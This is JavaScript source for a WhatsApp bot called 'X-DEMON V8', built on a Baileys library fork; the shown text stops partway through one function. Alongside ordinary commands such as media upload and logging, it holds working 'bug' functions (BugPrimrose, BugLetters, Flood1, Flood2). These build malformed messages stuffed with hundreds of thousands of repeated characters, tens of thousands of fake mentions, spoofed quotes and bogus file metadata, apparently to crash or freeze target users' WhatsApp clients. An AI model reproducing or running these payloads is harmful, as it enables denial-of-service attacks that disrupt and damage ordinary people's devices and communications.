require('./config');
const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const ms = require("parse-ms");
const fetch = require("node-fetch");
const JsConfuser = require('js-confuser');
const moment = require("moment-timezone");
const { spawn, exec, execSync } = require('child_process');
const sharp = require('sharp');
const { default: baileys, proto, generateWAMessage, generateWAMessageFromContent, getContentType, prepareWAMessageMedia, downloadContentFromMessage, downloadMediaMessage, generateWAMessageContent, waUploadToServer } = require("lotusbail");
const { url } = require('inspector');

module.exports = sock = async (sock, m, chatUpdate, store) => {
try {
const _sendMessage = sock.sendMessage.bind(sock)
sock.sendMessage = (jid, content, options = {}) => {
  return _sendMessage(jid, content, { ai: true, ...options })
}
const _relayMessage = sock.relayMessage.bind(sock)
sock.relayMessage = (jid, message, options = {}) => {
  return _relayMessage(jid, message, { AI: true, ...options })
}
// Message type handling
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const sender = m.key.fromMe
? sock.user.id.split(":")[0] + "@s.whatsapp.net" || sock.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.';
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");
const image = {url : 'https://files.catbox.moe/wwrz2s.png'}
const kontributor = JSON.parse(fs.readFileSync('./惡魔/系統/database/owner.json'));
const botNumber = await sock.decodeJid(sock.user.id);
const Access = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isCmd = body.startsWith(prefix);
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);

// Group function
const groupMetadata = isGroup ? await sock.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;

// Function
const { smsg, sendGmail, formatSize, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, sleep, tggl, jam } = require('./系統/myfunction');
    
const _prem = require("./系統/database/premium");
const isPremium = Access ? true : _prem.checkPremiumUser(m.sender);

// Foto
let cihuy = {url : "https://img1.pixhost.to/images/8221/634876969_uploaded_image.jpg"}
// Time
const time = moment.tz("Asia/Makassar").format("HH:mm:ss");
async function getThumb() {
  const res = await axios.get("https://files.catbox.moe/kyknef.jpg", { responseType: "arraybuffer" });
  return await sharp(res.data).resize(200, 200).jpeg({ quality: 100 }).toBuffer();
}
const qsock = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    documentMessage: {
       url: "https://mmg.whatsapp.net/v/t62.7119-24/536905938_25390031587252233_6580368586424850309_n.enc?ccb=11-4&oh=01_Q5Aa2QFKM5gOJ43S2oxjYf_QQFDkgnTHjDwHXZ7-vHNlE4ppWA&oe=68D12B23&_nc_sid=5e03e0&mms3=true",
       directPath: "/v/t62.7119-24/536905938_25390031587252233_6580368586424850309_n.enc?ccb=11-4&oh=01_Q5Aa2QFKM5gOJ43S2oxjYf_QQFDkgnTHjDwHXZ7-vHNlE4ppWA&oe=68D12B23&_nc_sid=5e03e0",
       mimetype: "application/json",
       mediaKey: "Qq155M2hE3RHIGVD2PtslEoVdISl2xMIubtdKzTeTUM=",
       fileEncSha256: "1CKQw/q76MKEiBT/9+15LB203zjFKNLp2YoLq6dZb0g=",
       fileSha256: "kkCD+53RVGZA3qmQ/i8lRzSamli3NmivnCVj7uJBuIY=",
       fileLength: 600,
       mediaKeyTimestamp: 1755954902,
       caption: "© 𝚇-𝙳𝙴𝙼𝙾𝙽 𝚅𝟾 || " + command,
    }
  }
}

// Console log
if (m.message) {
    const timeNow = moment.tz("Asia/Makassar").format("DD/MM/YYYY HH:mm:ss");
    const line = chalk.hex("#8e44ad")("══════════════════════════════════════");

    console.log(line);
    console.log(
        chalk.bgHex("#d91a01ff").black.bold("  さ NEW BOT MESSAGE RECEIVED  ")
    );
    console.log(line);

    console.log(
        chalk.hex("#11c1c1ff")(`📅 Tanggal   : `) + chalk.white(`${timeNow}`)
    );
    console.log(
        chalk.hex("#12d95fff")(`💬 Pesan     : `) + chalk.white(`${m.body || m.mtype}`)
    );
    console.log(
        chalk.hex("#12d95fff")(`🙋 Pengirim  : `) + chalk.white(`${m.pushName}`)
    );
    console.log(
        chalk.hex("#126cd9ff")(`📱 JID       : `) + chalk.white(`${senderNumber}`)
    );

    if (m.isGroup) {
        console.log(
            chalk.hex("#12d95fff")(`👥 Grup      : `) + chalk.white(`${groupName}`)
        );
        console.log(
            chalk.hex("#12d95fff")(`🆔 Group JID : `) + chalk.white(`${m.chat}`)
        );
    }

    console.log(line + "\n");
}

    
let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}

const RC = {url : 'https://files.catbox.moe/rwuuzb.jpg'}
const sockreply = async (teks) => {
return sock.sendMessage(m.chat, {
contextInfo: {
forwardingScore: 999,
isForwarded: true,
externalAdReply: {
showAdAttribution: true,
renderLargerThumbnail: false,
title: `© 𝚇-𝙳𝙴𝙼𝙾𝙽 𝚅𝟾 `,
body: `© ICHA CHAN`,
previewType: "VIDEO",
thumbnailUrl: "https://files.catbox.moe/rwuuzb.jpg",
sourceUrl: `t.me/iichacan`,
}
},
text: teks
}, {
quoted: qsock, AI: true
})
}
const sReact = async (r) => {
return await sock.sendMessage(m.chat, {
  react: {
    text: r,
    key: m.key
  }
})
}
const bugres = 'In processs'
const FormData = require("form-data");
async function toUrl(sock, m) {
  if (!m.message?.extendedTextMessage?.contextInfo?.quotedMessage) {
    return sockreply("❌ Reply media dengan perintah .tourl")
  }
  sReact('⌛')
  const quoted = m.message.extendedTextMessage.contextInfo.quotedMessage
  let fileName, mimetype
  if (quoted.imageMessage) {
    fileName = `photo_${Date.now()}.jpg`
    mimetype = quoted.imageMessage.mimetype
  } else if (quoted.videoMessage) {
    fileName = `video_${Date.now()}.mp4`
    mimetype = quoted.videoMessage.mimetype
  } else if (quoted.documentMessage) {
    fileName = quoted.documentMessage.fileName || `file_${Date.now()}`
    mimetype = quoted.documentMessage.mimetype
  } else {
    return sockreply("❌ Hanya support foto/video/document.")
  }
  try {
    const buffer = await downloadMediaMessage(
      { message: quoted },
      "buffer",
      {},
      { reuploadRequest: sock }
    )
    const form = new FormData()
    form.append("reqtype", "fileupload")
    form.append("fileToUpload", buffer, {
      filename: fileName,
      contentType: mimetype
    })
    const { data } = await axios.post("https://catbox.moe/user/api.php", form, {
      headers: form.getHeaders()
    })
    sockreply(`✅ Upload berhasil!\n📎 URL: ${data}`)
    sReact('✅')
  } catch (err) {
    console.error(err)
    sockreply("❌ Gagal upload ke Catbox.")
  }
}
    function generateRandomMessageId() {
      const prefix = "BAE5";
      const timestamp = Date.now().toString(36);
      const random = Math.random().toString(36).substr(2, 4);
      const hex = crypto_1.default.randomBytes(4).toString("hex").toUpperCase();
      return `${prefix}${timestamp}${random}${hex}`;
    }
    async function generateImageMessage() {
      try {
        const imageMessage = await generateWAMessageContent(
          {
            image: { url: "https://files.catbox.moe/rwuuzb.jpg" },
          },
          {
            upload: sock.waUploadToServer,
          }
        ).then((res) => res.imageMessage);
        return imageMessage;
      } catch (error) {
        console.error("Error generating image message:", error);
        return null;
      }
    }
    async function BugPrimrose(jid) {
      try {
        const cardTemplate = {
          header: {
            imageMessage: await generateImageMessage(),
            hasMediaAttachment: true,
          },
          body: {
            text: "ꦾ".repeat(25000) + `@0`.repeat(25000),
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "cta_url",
                buttonParamsJson:
                  '{"display_text":"Click Here!","url":"https://wa.me/settings","merchant_url":"https://wa.me/settings"}',
              },
            ],
          },
        };
        const bugImageMsg = {
          botInvokeMessage: {
            message: {
              interactiveMessage: {
                body: {
                  text: "[̡̬̣̯̼͓͈̹͢P̷̷͇̳͔̪̹͉̯̟̟_̷̠̤͓͉̱̹͖̻͓͝L̶̥̤̤̪̜̩͇͟] ̨̣͕͉̫̜ͅI̴̞̦̦̗̥̥͇̰͉͖̭̫̻̜͡Ş̯͕ ̵̶̱͉̳̠͢C̷̢̩͍̳̱̱̖̫̟̺̰͢͠͞Ơ͍̱͎̯̣͕̤̜͍̥͝M͏̨̬̗͍͓̘̣͕͉̫̜ͅI̴̵̞̦̦̗̥͎̲̞̣̥͘N͚̟͉̭̘͎̠̬̜̱̲̮̤͟͞G̷̜͍͚͎̤̀!⟆̊",
                },
                contextInfo: {
                  mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from(
                      {
                        length: 30000,
                      },
                      () =>
                        "1" +
                        Math.floor(Math.random() * 500000) +
                        "@s.whatsapp.net"
                    ),
                  ],
                  forwardingScore: 1,
                  isForwarded: true,
                  fromMe: false,
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  quotedMessage: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mimetype:
                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256:
                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                      fileLength: "9999999999999",
                      pageCount: 1316134911,
                      mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                      fileName: "[🅟_🅛]",
                      fileEncSha256:
                        "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                      directPath:
                        "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1724474503",
                      contactVcard: true,
                      thumbnailDirectPath:
                        "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                      thumbnailSha256:
                        "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                      thumbnailEncSha256:
                        "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                      jpegThumbnail: "",
                    },
                  },
                },
                carouselMessage: {
                  cards: Array(1).fill(cardTemplate),
                  messageVersion: 1,
                },
              },
            },
          },
        };
        await sock.relayMessage(jid, bugImageMsg, {
          participant: { jid: jid },
          userJid: jid,
          messageId: generateRandomMessageId(),
          ephemeralExpiration: 172800,
        });
      } catch (err) {
        console.log(err);
      }
    }
    const Qrad = {
      key: {
        isForwarded: true,
        remoteJid: "status@broadcast",
        fromMe: false,
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: `[🅟_🅛]‏‎`,
            format: "DEFAULT",
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: JSON.stringify({
              screen_2_OptIn_0: true,
              screen_2_OptIn_1: true,
              screen_1_Dropdown_0: "[🅟_🅛]",
              screen_1_DatePicker_1: "1028995200000",
              screen_1_TextInput_2: "@JackV2",
              screen_1_TextInput_3: "94643116",
              screen_0_TextInput_0: `[̡̬̣̯̼͓͈̹͢P̷̷͇̳͔̪̹͉̯̟̟_̷̠̤͓͉̱̹͖̻͓͝L̶̥̤̤̪̜̩͇͟] ̨̣͕͉̫̜ͅI̴̞̦̦̗̥̥͇̰͉͖̭̫̻̜͡Ş̯͕ ̵̶̱͉̳̠͢C̷̢̩͍̳̱̱̖̫̟̺̰͢͠͞Ơ͍̱͎̯̣͕̤̜͍̥͝M͏̨̬̗͍͓̘̣͕͉̫̜ͅI̴̵̞̦̦̗̥͎̲̞̣̥͘N͚̟͉̭̘͎̠̬̜̱̲̮̤͟͞G̷̜͍͚͎̤̀!⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(
                1045000
              )}`,
              screen_0_TextInput_1: "INFINITE",
              screen_0_Dropdown_2: "001-Grimgar",
              screen_0_RadioButtonsGroup_3: "0_true",
              flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s.",
            }),
            version: 3,
          },
        },
      },
    };
    const dottm = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast",
      },
      message: {
        orderMessage: {
          orderId: "999999999999",
          thumbnail: null,
          itemCount: 999999999999,
          status: "INQUIRY",
          surface: "CATALOG",
          message: "[̡̬̣̯̼͓͈̹͢P̷̷͇̳͔̪̹͉̯̟̟_̷̠̤͓͉̱̹͖̻͓͝L̶̥̤̤̪̜̩͇͟] ̨̣͕͉̫̜ͅI̴̞̦̦̗̥̥͇̰͉͖̭̫̻̜͡Ş̯͕ ̵̶̱͉̳̠͢C̷̢̩͍̳̱̱̖̫̟̺̰͢͠͞Ơ͍̱͎̯̣͕̤̜͍̥͝M͏̨̬̗͍͓̘̣͕͉̫̜ͅI̴̵̞̦̦̗̥͎̲̞̣̥͘N͚̟͉̭̘͎̠̬̜̱̲̮̤͟͞G̷̜͍͚͎̤̀!",
          token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA==",
        },
      },
      contextInfo: {
        mentionedJid: ["27746135260@s.whatsapp.net"],
        forwardingScore: 999,
        isForwarded: true,
      },
    };
    const VisiX = {
      key: {
        remoteJid: "p",
        fromMe: false,
        participant: "0@s.whatsapp.net",
      },
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Sent",
            format: "DEFAULT",
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: JSON.stringify({
              screen_2_OptIn_0: true,
              screen_2_OptIn_1: true,
              screen_1_Dropdown_0: "[🅟_🅛]",
              screen_1_DatePicker_1: "1028995200000",
              screen_1_TextInput_2: "@JackV2",
              screen_1_TextInput_3: "94643116",
              screen_0_TextInput_0: `[̡̬̣̯̼͓͈̹͢P̷̷͇̳͔̪̹͉̯̟̟_̷̠̤͓͉̱̹͖̻͓͝L̶̥̤̤̪̜̩͇͟] ̨̣͕͉̫̜ͅI̴̞̦̦̗̥̥͇̰͉͖̭̫̻̜͡Ş̯͕ ̵̶̱͉̳̠͢C̷̢̩͍̳̱̱̖̫̟̺̰͢͠͞Ơ͍̱͎̯̣͕̤̜͍̥͝M͏̨̬̗͍͓̘̣͕͉̫̜ͅI̴̵̞̦̦̗̥͎̲̞̣̥͘N͚̟͉̭̘͎̠̬̜̱̲̮̤͟͞G̷̜͍͚͎̤̀⟆̊‏‎‏‎‏‎‏⭑̤${"\u0003".repeat(
                1020000
              )}`,
              screen_0_TextInput_1: "INFINITE",
              screen_0_Dropdown_2: "001-Grimgar",
              screen_0_RadioButtonsGroup_3: "0_true",
              flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s.",
            }),
            version: 3,
          },
        },
      },
    };
    //===========================================================================
    //                             FUNCTION RELAY                              //
    //===========================================================================
    async function BugLetters(jid) {
      try {

        const messsage = {
          viewOnceMessage: {
            message: {
              newsletterAdminInviteMessage: {
                newsletterJid: `120363298524333133@newsletter`,
                newsletterName: "[̡̬̣̯̼͓͈̹͢P̷̷͇̳͔̪̹͉̯̟̟_̷̠̤͓͉̱̹͖̻͓͝L̶̥̤̤̪̜̩͇͟] ̨̣͕͉̫̜ͅI̴̞̦̦̗̥̥͇̰͉͖̭̫̻̜͡Ş̯͕ ̵̶̱͉̳̠͢C̷̢̩͍̳̱̱̖̫̟̺̰͢͠͞Ơ͍̱͎̯̣͕̤̜͍̥͝M͏̨̬̗͍͓̘̣͕͉̫̜ͅI̴̵̞̦̦̗̥͎̲̞̣̥͘N͚̟͉̭̘͎̠̬̜̱̲̮̤͟͞G̷̜͍͚͎̤̀!⟆̊" + "ꦾ".repeat(120000),
                jpegThumbnail: "",
                caption: "ꦽ".repeat(120000),
                inviteExpiration: Date.now() + 1814400000,
              },
            },
          },
        };
        await sock.relayMessage(jid, messsage, {
          participant: { jid: jid },
          userJid: jid,
          messageId: generateRandomMessageId(),
          ephemeralExpiration: 172800,
        });
      } catch (err) {
        console.log(err);
      }
    }
    async function Flood1(jid) {
      try {

        await sock.relayMessage(
          phoneNum,
          {
            extendedTextMessage: {
              text: "[̡̬̣̯̼͓͈̹͢P̷̷͇̳͔̪̹͉̯̟̟_̷̠̤͓͉̱̹͖̻͓͝L̶̥̤̤̪̜̩͇͟] ̨̣͕͉̫̜ͅI̴̞̦̦̗̥̥͇̰͉͖̭̫̻̜͡Ş̯͕ ̵̶̱͉̳̠͢C̷̢̩͍̳̱̱̖̫̟̺̰͢͠͞Ơ͍̱͎̯̣͕̤̜͍̥͝M͏̨̬̗͍͓̘̣͕͉̫̜ͅI̴̵̞̦̦̗̥͎̲̞̣̥͘N͚̟͉̭̘͎̠̬̜̱̲̮̤͟͞G̷̜͍͚͎̤̀!‏‎‏‎‏‎‏⭑̤\n" + `@0`.repeat(25000),
              contextInfo: {
                mentionedJid: [
                  `0@s.whatsapp.net`,
                  ...Array.from(
                    {
                      length: 15000,
                    },
                    () => `1@s.whatsapp.net`
                  ),
                ],
                stanzaId: "1234567890ABCDEF",
                participant: "0@s.whatsapp.net",
                quotedMessage: {
                  Qrad,
                },
                remotejid: phoneNum,
                conversionSource: " X ",
                conversionData:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                conversionDelaySeconds: 10,
                forwardingScore: 9999999,
                isForwarded: true,
                quotedAd: {
                  advertiserName: " X ",
                  mediaType: "IMAGE",
                  jpegThumbnail:
                    "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                  caption: " X ",
                },
                placeholderKey: {
                  remoteJid: "0@s.whatsapp.net",
                  fromMe: false,
                  id: "ABCDEF1234567890",
                },
                expiration: 172800,
                ephemeralSettingTimestamp: "1728090592378",
                ephemeralSharedSecret:
                  "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
                externalAdReply: {
                  title: "[🅟_🅛]",
                  body: "[̡̬̣̯̼͓͈̹͢P̷̷͇̳͔̪̹͉̯̟̟_̷̠̤͓͉̱̹͖̻͓͝L̶̥̤̤̪̜̩͇͟] ̨̣͕͉̫̜ͅI̴̞̦̦̗̥̥͇̰͉͖̭̫̻̜͡Ş̯͕ ̵̶̱͉̳̠͢C̷̢̩͍̳̱̱̖̫̟̺̰͢͠͞Ơ͍̱͎̯̣͕̤̜͍̥͝M͏̨̬̗͍͓̘̣͕͉̫̜ͅI̴̵̞̦̦̗̥͎̲̞̣̥͘N͚̟͉̭̘͎̠̬̜̱̲̮̤͟͞G̷̜͍͚͎̤̀!",
                  mediaType: "VIDEO",
                  renderLargerThumbnail: true,
                  previewType: "VIDEO",
                  thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
                  sourceType: " x ",
                  sourceId: " x ",
                  sourceUrl: `https://xnxx.com/`,
                  mediaUrl: `https://xnxx.com/`,
                  containsAutoReply: true,
                  showAdAttribution: true,
                  ctwaClid: "ctwa_clid_example",
                  ref: "ref_example",
                },
                entryPointConversionSource: "entry_point_source_example",
                entryPointConversionApp: "entry_point_app_example",
                entryPointConversionDelaySeconds: 5,
                disappearingMode: {},
                actionLink: {
                  url: `https://xnxx.com/`,
                },
                groupSubject: " X ",
                parentGroupJid: "6287888888888-1234567890@g.us",
                trustBannerType: " X ",
                trustBannerAction: 1,
                isSampled: false,
                utm: {
                  utmSource: " X ",
                  utmCampaign: " X ",
                },
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "6287888888888-1234567890@g.us",
                  serverMessageId: 1,
                  newsletterName: " X ",
                  contentType: "UPDATE",
                  accessibilityText: " X ",
                },
                businessMessageForwardInfo: {
                  businessOwnerJid: "0@s.whatsapp.net",
                },
                smbClientCampaignId: "smb_client_campaign_id_example",
                smbServerCampaignId: "smb_server_campaign_id_example",
                dataSharingContext: {
                  showMmDisclosure: true,
                },
              },
            },
          },
          {
            ephemeralExpiration: 172800,
            messageId: generateRandomMessageId(),
            participant: phoneNum,
          }
        );
      } catch (err) {
        console.log(err);
      }
    }
    async function Flood2(jid) {
      try {

        const messsage = {
          botInvokeMessage: {
            message: {
              interactiveMessage: {
                header: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                    fileName: "[🅟_🅛]⟆̊‏‎‏‎‏‎‏⭑̤",
                    fileEncSha256:
                      "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                    directPath:
                      "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1726867151",
                    contactVcard: true,
                    jpegThumbnail: "",
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text:
                    "[̡̬̣̯̼͓͈̹͢P̷̷͇̳͔̪̹͉̯̟̟_̷̠̤͓͉̱̹͖̻͓͝L̶̥̤̤̪̜̩͇͟] ̨̣͕͉̫̜ͅI̴̞̦̦̗̥̥͇̰͉͖̭̫̻̜͡Ş̯͕ ̵̶̱͉̳̠͢C̷̢̩͍̳̱̱̖̫̟̺̰͢͠͞Ơ͍̱͎̯̣͕̤̜͍̥͝M͏̨̬̗͍͓̘̣͕͉̫̜ͅI̴̵̞̦̦̗̥͎̲̞̣̥͘N͚̟͉̭̘͎̠̬̜̱̲̮̤͟͞G̷̜͍͚͎̤̀!⟆̊‏‎‏‎‏‎‏⭑̤\n" +
                    "ꦾ".repeat(50000) +
                    `@0`.repeat(50000),
                },
                nativeFlowMessage: {
                  name: "cta_url",
                  messageParamsJson:
                    '{ display_text: \'✨⃟༑⌁⃰U̳̿͟͞N̳̿͟͞-H̳̿͟͞A̳̿͟͞X̳̿͟͞ F̳̿͟͞O̳̿͟͞R̳̿͟͞ Y̳̿͟͞O̳̿͟͞U̳̿͟͞! ϟ〽️\', url: "https://youtube.com/AKMJ", merchant_url: "https://youtube.com/AKMJ" }',
                },
                contextInfo: {
                  mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from(
                      {
                        length: 30000,
                      },
                      () =>
                        "1" +
                        Math.floor(Math.random() * 500000) +
                        "@s.whatsapp.net"
                    ),
